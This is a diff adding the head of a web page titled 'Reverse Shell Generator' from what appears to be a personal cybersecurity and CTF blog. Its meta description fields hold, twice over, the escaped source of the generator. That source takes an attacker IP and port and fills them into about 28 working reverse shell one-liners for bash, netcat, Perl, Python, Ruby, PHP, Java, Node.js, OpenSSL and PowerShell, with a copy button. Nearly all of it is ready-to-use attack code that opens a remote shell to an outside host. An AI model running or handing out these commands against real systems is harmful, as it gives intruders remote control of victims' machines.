@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Reverse Shell Generator · RedFish
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="RedFish">
+<meta name="description" content="&lt;!DOCTYPE html&gt;
+
+
+    
+    
+    
+
+
+    
+        🔄 Reverse Shell Generator
+    &lt;div id=&quot;input-form&quot;&gt;
+        &lt;h3&gt;Configuration&lt;/h3&gt;
+        &lt;div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;ip-input&quot;&gt;Attacker IP:&lt;/label&gt;
+                &lt;input type=&quot;text&quot; id=&quot;ip-input&quot; placeholder=&quot;192.168.1.100&quot;&gt;
+            &lt;/div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;port-input&quot;&gt;Port:&lt;/label&gt;
+                &lt;input type=&quot;number&quot; id=&quot;port-input&quot; placeholder=&quot;4444&quot;&gt;
+            &lt;/div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;category-select&quot;&gt;Category:&lt;/label&gt;
+                &lt;select id=&quot;category-select&quot;&gt;
+                    &lt;option value=&quot;all&quot;&gt;All Shells&lt;/option&gt;
+                    &lt;option value=&quot;linux&quot;&gt;Linux&lt;/option&gt;
+                    &lt;option value=&quot;windows&quot;&gt;Windows&lt;/option&gt;
+                    &lt;option value=&quot;mac&quot;&gt;macOS&lt;/option&gt;
+                &lt;/select&gt;
+            &lt;/div&gt;
+            &lt;button onclick=&quot;generateShells()&quot; style=&quot;margin-top: 25px;&quot;&gt;Generate&lt;/button&gt;
+        &lt;/div&gt;
+        &lt;p class=&quot;info&quot;&gt;💡 Or use URL: &lt;code&gt;?ip:port&lt;/code&gt; (e.g., &lt;code&gt;?192.168.1.100:4444&lt;/code&gt;)&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;div id=&quot;shells-container&quot; style=&quot;display: none;&quot;&gt;
+        &lt;div id=&quot;shells-output&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div id=&quot;no-params&quot; class=&quot;no-params&quot;&gt;
+        &lt;p&gt;Enter IP and Port to generate reverse shells&lt;/p&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    const shellDatabase = [
+        {name: &quot;Bash -i&quot;, command: &quot;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash 196&quot;, command: &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{ip}/{port}; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash read line&quot;, command: &quot;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash 5&quot;, command: &quot;bash -i 5&lt;&gt; /dev/tcp/{ip}/{port} 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash UDP&quot;, command: &quot;bash -i &gt;&amp; /dev/udp/{ip}/{port} 0&gt;&amp;1&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc mkfifo&quot;, command: &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/f&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc -e&quot;, command: &quot;nc -e bash {ip} {port}&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc -c&quot;, command: &quot;nc -c bash {ip} {port}&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;BusyBox nc&quot;, command: &quot;busybox nc {ip} {port} -e bash&quot;, meta: [&quot;linux&quot;]},
+        {name: &quot;ncat -e&quot;, command: &quot;ncat {ip} {port} -e bash&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Perl&quot;, command: &quot;perl -e &#39;use Socket;$i=\&quot;{ip}\&quot;;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Perl no sh&quot;, command: &quot;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\&quot;{ip}:{port}\&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Python&quot;, command: &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;{ip}\&quot;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Python3&quot;, command: &quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;{ip}\&quot;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Ruby&quot;, command: &quot;ruby -rsocket -e&#39;f=TCPSocket.new(\&quot;{ip}\&quot;,{port});exec sprintf(\&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&quot;,f,f,f)&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP fsockopen&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;, $pipes);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP shell_exec&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});shell_exec(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP system&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});system(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP passthru&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});passthru(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;PHP backticks&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});`/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP proc_open&quot;, command: &quot;php -r &#39;$sock=fsockopen(\&quot;{ip}\&quot;,{port});$proc=proc_open(\&quot;/bin/bash\&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Java&quot;, command: &quot;r = Runtime.getRuntime(); p = r.exec([\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do \\\\$line 2&gt;&amp;5 &gt;&amp;5; done\&quot;] as String[]).waitFor();&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Node.js&quot;, command: &quot;require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&#39;)&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;OpenSSL&quot;, command: &quot;mkfifo /tmp/s; bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect {ip}:{port} &gt; /tmp/s; rm /tmp/s&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;PowerShell #1&quot;, command: &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;PowerShell #2&quot;, command: &quot;powershell -nop -c \&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\&quot;&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;nc.exe&quot;, command: &quot;nc.exe {ip} {port} -e cmd.exe&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;ncat.exe&quot;, command: &quot;ncat.exe {ip} {port} -e cmd.exe&quot;, meta: [&quot;windows&quot;]}
+    ];
+
+    window.addEventListener(&#39;load&#39;, function() {
+        const params = new URLSearchParams(window.location.search);
+        let ip = null, port = null;
+        if (params.has(&#39;ip&#39;) &amp;&amp; params.has(&#39;port&#39;)) {
+            ip = params.get(&#39;ip&#39;);
+            port = params.get(&#39;port&#39;);
+        } else {
+            const firstParam = Array.from(params.keys())[0];
+            if (firstParam &amp;&amp; firstParam.includes(&#39;:&#39;)) {
+                const parts = firstParam.split(&#39;:&#39;);
+                ip = parts[0];
+                port = parts[1];
+            }
+        }
+        if (ip &amp;&amp; port) {
+            document.getElementById(&#39;ip-input&#39;).value = ip;
+            document.getElementById(&#39;port-input&#39;).value = port;
+            generateShells();
+        }
+    });
+
+    function generateShells() {
+        const ip = document.getElementById(&#39;ip-input&#39;).value.trim();
+        const port = document.getElementById(&#39;port-input&#39;).value.trim();
+        const category = document.getElementById(&#39;category-select&#39;).value;
+        if (!ip || !port) {
+            alert(&#39;Please enter both IP and Port&#39;);
+            return;
+        }
+        if (!/^\d&#43;\.\d&#43;\.\d&#43;\.\d&#43;$/.test(ip)) {
+            alert(&#39;Invalid IP format&#39;);
+            return;
+        }
+        if (isNaN(port) || port &lt; 1 || port &gt; 65535) {
+            alert(&#39;Invalid port (1-65535)&#39;);
+            return;
+        }
+        window.history.replaceState({}, &#39;&#39;, `?${ip}:${port}`);
+        const output = document.getElementById(&#39;shells-output&#39;);
+        output.innerHTML = &#39;&#39;;
+        shellDatabase.forEach(shell =&gt; {
+            if (category !== &#39;all&#39; &amp;&amp; !shell.meta.includes(category)) {
+                return;
+            }
+            const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port);
+            const platforms = shell.meta.map(m =&gt; {
+                const icons = { linux: &#39;🐧&#39;, mac: &#39;🍎&#39;, windows: &#39;🪟&#39; };
+                return icons[m] || m;
+            }).join(&#39; &#39;);
+            const shellBox = document.createElement(&#39;div&#39;);
+            shellBox.className = &#39;shell-box&#39;;
+            shellBox.innerHTML = `
+                &lt;div style=&quot;display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&quot;&gt;
+                    &lt;h3 style=&quot;margin: 0;&quot;&gt;${shell.name}&lt;/h3&gt;
+                    &lt;span&gt;${platforms}&lt;/span&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;shell-output&quot; id=&quot;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&quot;&gt;${command}&lt;/div&gt;
+                &lt;button class=&quot;copy-btn&quot; onclick=&quot;copyToClipboard(&#39;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&#39;)&quot;&gt;Copy&lt;/button&gt;
+            `;
+            output.appendChild(shellBox);
+        });
+        document.getElementById(&#39;shells-container&#39;).style.display = &#39;block&#39;;
+        document.getElementById(&#39;no-params&#39;).style.display = &#39;none&#39;;
+    }
+
+    function copyToClipboard(elementId) {
+        const element = document.getElementById(elementId);
+        const text = element.textContent;
+        navigator.clipboard.writeText(text).then(() =&gt; {
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = &#39;✓ Copied!&#39;;
+            button.style.background = &#39;#00aa00&#39;;
+            setTimeout(() =&gt; {
+                button.textContent = originalText;
+                button.style.background = &#39;&#39;;
+            }, 2000);
+        }).catch(err =&gt; {
+            alert(&#39;Failed to copy: &#39; &#43; err);
+        });
+    }
+
+    document.getElementById(&#39;ip-input&#39;).addEventListener(&#39;keypress&#39;, function(e) {
+        if (e.key === &#39;Enter&#39;) generateShells();
+    });
+    document.getElementById(&#39;port-input&#39;).addEventListener(&#39;keypress&#39;, function(e) {
+        if (e.key === &#39;Enter&#39;) generateShells();
+    });
+    document.getElementById(&#39;category-select&#39;).addEventListener(&#39;change&#39;, function(e) {
+        const ip = document.getElementById(&#39;ip-input&#39;).value.trim();
+        const port = document.getElementById(&#39;port-input&#39;).value.trim();
+        if (ip &amp;&amp; port) {
+            generateShells();
+        }
+    });
+&lt;/script&gt;
+
+
+">
+<meta name="keywords" content="blog,cybersecurity,ctf,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Reverse Shell Generator">
+	<meta name="twitter:description" content="&lt;!DOCTYPE html&gt; 🔄 Reverse Shell Generator &lt;div id=&#34;input-form&#34;&gt; &lt;h3&gt;Configuration&lt;/h3&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&#34;ip-input&#34;&gt;Attacker IP:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;ip-input&#34; placeholder=&#34;192.168.1.100&#34;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&#34;port-input&#34;&gt;Port:&lt;/label&gt; &lt;input type=&#34;number&#34; id=&#34;port-input&#34; placeholder=&#34;4444&#34;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&#34;category-select&#34;&gt;Category:&lt;/label&gt; &lt;select id=&#34;category-select&#34;&gt; &lt;option value=&#34;all&#34;&gt;All Shells&lt;/option&gt; &lt;option value=&#34;linux&#34;&gt;Linux&lt;/option&gt; &lt;option value=&#34;windows&#34;&gt;Windows&lt;/option&gt; &lt;option value=&#34;mac&#34;&gt;macOS&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;button onclick=&#34;generateShells()&#34; style=&#34;margin-top: 25px;&#34;&gt;Generate&lt;/button&gt; &lt;/div&gt; &lt;p class=&#34;info&#34;&gt;💡 Or use URL: &lt;code&gt;?ip:port&lt;/code&gt; (e.g., &lt;code&gt;?192.168.1.100:4444&lt;/code&gt;)&lt;/p&gt; &lt;/div&gt; &lt;div id=&#34;shells-container&#34; style=&#34;display: none;&#34;&gt; &lt;div id=&#34;shells-output&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id=&#34;no-params&#34; class=&#34;no-params&#34;&gt; &lt;p&gt;Enter IP and Port to generate reverse shells&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; const shellDatabase = [ {name: &#34;Bash -i&#34;, command: &#34;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash 196&#34;, command: &#34;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{ip}/{port}; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash read line&#34;, command: &#34;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash 5&#34;, command: &#34;bash -i 5&lt;&gt; /dev/tcp/{ip}/{port} 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash UDP&#34;, command: &#34;bash -i &gt;&amp; /dev/udp/{ip}/{port} 0&gt;&amp;1&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc mkfifo&#34;, command: &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/f&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc -e&#34;, command: &#34;nc -e bash {ip} {port}&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc -c&#34;, command: &#34;nc -c bash {ip} {port}&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;BusyBox nc&#34;, command: &#34;busybox nc {ip} {port} -e bash&#34;, meta: [&#34;linux&#34;]}, {name: &#34;ncat -e&#34;, command: &#34;ncat {ip} {port} -e bash&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Perl&#34;, command: &#34;perl -e &#39;use Socket;$i=\&#34;{ip}\&#34;;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&#34;tcp\&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&#34;&gt;&amp;S\&#34;);open(STDOUT,\&#34;&gt;&amp;S\&#34;);open(STDERR,\&#34;&gt;&amp;S\&#34;);exec(\&#34;/bin/sh -i\&#34;);};&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Perl no sh&#34;, command: &#34;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\&#34;{ip}:{port}\&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Python&#34;, command: &#34;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;{ip}\&#34;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Python3&#34;, command: &#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;{ip}\&#34;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\&#34;/bin/bash\&#34;)&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Ruby&#34;, command: &#34;ruby -rsocket -e&#39;f=TCPSocket.new(\&#34;{ip}\&#34;,{port});exec sprintf(\&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&#34;,f,f,f)&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP fsockopen&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;, $pipes);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP shell_exec&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});shell_exec(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP system&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});system(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP passthru&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});passthru(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;PHP backticks&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});`/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP proc_open&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});$proc=proc_open(\&#34;/bin/bash\&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Java&#34;, command: &#34;r = Runtime.getRuntime(); p = r.exec([\&#34;/bin/bash\&#34;,\&#34;-c\&#34;,\&#34;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do \\\\$line 2&gt;&amp;5 &gt;&amp;5; done\&#34;] as String[]).waitFor();&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Node.js&#34;, command: &#34;require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&#39;)&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;OpenSSL&#34;, command: &#34;mkfifo /tmp/s; bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect {ip}:{port} &gt; /tmp/s; rm /tmp/s&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;PowerShell #1&#34;, command: &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;, meta: [&#34;windows&#34;]}, {name: &#34;PowerShell #2&#34;, command: &#34;powershell -nop -c \&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\&#34;&#34;, meta: [&#34;windows&#34;]}, {name: &#34;nc.exe&#34;, command: &#34;nc.exe {ip} {port} -e cmd.exe&#34;, meta: [&#34;windows&#34;]}, {name: &#34;ncat.exe&#34;, command: &#34;ncat.exe {ip} {port} -e cmd.exe&#34;, meta: [&#34;windows&#34;]} ]; window.addEventListener(&#39;load&#39;, function() { const params = new URLSearchParams(window.location.search); let ip = null, port = null; if (params.has(&#39;ip&#39;) &amp;&amp; params.has(&#39;port&#39;)) { ip = params.get(&#39;ip&#39;); port = params.get(&#39;port&#39;); } else { const firstParam = Array.from(params.keys())[0]; if (firstParam &amp;&amp; firstParam.includes(&#39;:&#39;)) { const parts = firstParam.split(&#39;:&#39;); ip = parts[0]; port = parts[1]; } } if (ip &amp;&amp; port) { document.getElementById(&#39;ip-input&#39;).value = ip; document.getElementById(&#39;port-input&#39;).value = port; generateShells(); } }); function generateShells() { const ip = document.getElementById(&#39;ip-input&#39;).value.trim(); const port = document.getElementById(&#39;port-input&#39;).value.trim(); const category = document.getElementById(&#39;category-select&#39;).value; if (!ip || !port) { alert(&#39;Please enter both IP and Port&#39;); return; } if (!/^\d&#43;\.\d&#43;\.\d&#43;\.\d&#43;$/.test(ip)) { alert(&#39;Invalid IP format&#39;); return; } if (isNaN(port) || port &lt; 1 || port &gt; 65535) { alert(&#39;Invalid port (1-65535)&#39;); return; } window.history.replaceState({}, &#39;&#39;, `?${ip}:${port}`); const output = document.getElementById(&#39;shells-output&#39;); output.innerHTML = &#39;&#39;; shellDatabase.forEach(shell =&gt; { if (category !== &#39;all&#39; &amp;&amp; !shell.meta.includes(category)) { return; } const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port); const platforms = shell.meta.map(m =&gt; { const icons = { linux: &#39;🐧&#39;, mac: &#39;🍎&#39;, windows: &#39;🪟&#39; }; return icons[m] || m; }).join(&#39; &#39;); const shellBox = document.createElement(&#39;div&#39;); shellBox.className = &#39;shell-box&#39;; shellBox.innerHTML = ` &lt;div style=&#34;display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&#34;&gt; &lt;h3 style=&#34;margin: 0;&#34;&gt;${shell.name}&lt;/h3&gt; &lt;span&gt;${platforms}&lt;/span&gt; &lt;/div&gt; &lt;div class=&#34;shell-output&#34; id=&#34;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&#34;&gt;${command}&lt;/div&gt; &lt;button class=&#34;copy-btn&#34; onclick=&#34;copyToClipboard(&#39;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&#39;)&#34;&gt;Copy&lt;/button&gt; `; output.appendChild(shellBox); }); document.getElementById(&#39;shells-container&#39;).style.display = &#39;block&#39;; document.getElementById(&#39;no-params&#39;).style.display = &#39;none&#39;; } function copyToClipboard(elementId) { const element = document.getElementById(elementId); const text = element.textContent; navigator.clipboard.writeText(text).then(() =&gt; { const button = event.target; const originalText = button.textContent; button.textContent = &#39;✓ Copied!&#39;; button.style.background = &#39;#00aa00&#39;; setTimeout(() =&gt; { button.textContent = originalText; button.style.background = &#39;&#39;; }, 2000); }).catch(err =&gt; { alert(&#39;Failed to copy: &#39; &#43; err); }); } document.getElementById(&#39;ip-input&#39;).addEventListener(&#39;keypress&#39;, function(e) { if (e.key === &#39;Enter&#39;) generateShells(); }); document.getElementById(&#39;port-input&#39;).addEventListener(&#39;keypress&#39;, function(e) { if (e.key === &#39;Enter&#39;) generateShells(); }); document.getElementById(&#39;category-select&#39;).addEventListener(&#39;change&#39;, function(e) { const ip = document.getElementById(&#39;ip-input&#39;).value.trim(); const port = document.getElementById(&#39;port-input&#39;).value.trim(); if (ip &amp;&amp; port) { generateShells(); } }); &lt;/script&gt;">
+
+<meta property="og:url" content="http://www.axolol.fr/rs/">
+	<meta property="og:site_name" content="RedFish">
+	<meta property="og:title" content="Reverse Shell Generator">
